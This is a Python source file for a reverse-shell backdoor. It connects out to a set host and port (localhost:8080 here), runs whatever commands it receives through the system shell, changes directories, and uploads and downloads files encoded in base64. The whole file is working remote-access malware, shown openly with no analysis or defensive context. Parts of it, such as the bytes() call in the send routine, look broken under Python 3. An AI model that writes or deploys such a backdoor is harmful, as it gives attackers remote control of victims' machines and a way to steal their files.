import socket
import subprocess
import json
import os
import base64
import sys


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    @staticmethod
    def change_working_directory_to(path):
        os.chdir(path)
        return "[+] Change working directory to " + path

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Succesful"

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command Execution"
            self.reliable_send(command_result)


backdoor = Backdoor("localhost", 8080)
backdoor.run()